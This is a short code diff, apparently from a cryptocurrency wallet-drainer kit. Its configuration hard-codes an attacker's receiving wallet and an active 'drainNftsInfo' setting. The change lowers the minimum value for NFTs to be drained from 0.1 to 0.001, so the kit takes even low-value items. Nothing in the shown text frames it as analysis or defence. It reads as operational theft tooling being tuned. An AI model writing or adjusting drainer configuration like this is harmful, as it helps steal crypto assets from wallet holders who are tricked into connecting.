@@ -26,7 +26,7 @@ const receiveAddress = '0xc12363490b9e6c56ee739c832E4cd4ac5c8287C6',
 
   drainNftsInfo = {
     active: true,
-    minValue: 0.1,
+    minValue: 0.001,
     nftReceiveAddress: '0xc12363490b9e6c56ee739c832E4cd4ac5c8287C6',
   },
 
